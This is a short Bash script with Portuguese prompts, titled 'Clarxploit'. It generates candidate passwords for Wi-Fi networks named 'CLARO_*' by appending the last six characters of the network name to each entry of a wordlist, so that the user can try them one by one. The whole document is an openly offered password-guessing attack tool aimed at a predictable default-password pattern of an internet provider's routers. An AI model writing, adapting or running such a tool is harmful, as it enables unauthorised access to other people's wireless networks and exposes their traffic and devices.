echo "Clarxploit"

read -p "Digite o nome do Wi-Fi alvo: " wifi_nome

if [[ ! $wifi_nome == CLARO_* ]]; then
    echo "Insira um Wi-Fi da Claro!"
    exit 1
fi

ultimos_seis_digitos=$(echo $wifi_nome | tail -c 7)

echo "Gerando tentativas de senhas para o Wi-Fi..."
while IFS= read -r linha
do
    echo "$linha$ultimos_seis_digitos"
    read -r -s -n 1 -p "Pressione Enter se a senha não funcionar, Ctrl+C se funcionar.
" input < /dev/tty
    if [[ $input == $'\x0a' ]]; then
        continue
    fi
done < wlist.txt
